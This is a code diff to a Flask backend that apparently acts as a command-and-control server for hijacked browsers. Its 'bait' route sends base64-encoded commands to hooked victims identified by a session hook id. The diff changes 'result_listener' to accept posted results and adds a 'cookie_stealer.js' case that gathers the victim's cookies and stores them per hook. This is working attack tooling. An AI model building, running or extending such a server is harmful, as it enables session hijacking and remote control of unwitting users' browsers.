@@ -12,7 +12,6 @@ bp = Blueprint('command', __name__)
 @cross_origin(supports_credentials=True)
 def bait():
     from api.server import app
-    print(session.items())
     hook_id = session.get('hook_id')
     if not hook_id:
         abort(403)
@@ -37,18 +36,27 @@ def bait():
     return jsonify(command=base64.b64encode(command_value.encode()).decode())
 
 @bp.route('/result_listener', methods=['POST'])
-@cross_origin()
+@cross_origin(supports_credentials=True)
 def result_listener():
     hook_id = session.get('hook_id')
     if not hook_id:
         abort(403)
 
-    module_name = request.args['module_name']
-    result = request.args['result']
+    module_value = request.form.get('module_value')
+    result = request.form.get('result')
+
+    if not module_value or not result:
+        abort(400)
+
+    if not Module.has_value(module_value):
+        abort(400)
+
+    if module_value == 'cookie_stealer.js':
+        result = ',\n'.join([f'{name}={value}' for name, value in request.cookies.items()])
 
     from ..hook.models import Hook
-    column = Module.get_module_as_db_column(module_name)
-    curr_hook = Hook.query.filter_by(id=session.get).first_or_404()
+    column = Module.get_module_as_db_column(module_value)
+    curr_hook = Hook.query.filter(Hook.id == hook_id).first_or_404()
 
     if not hasattr(Hook, column):
         abort(400)
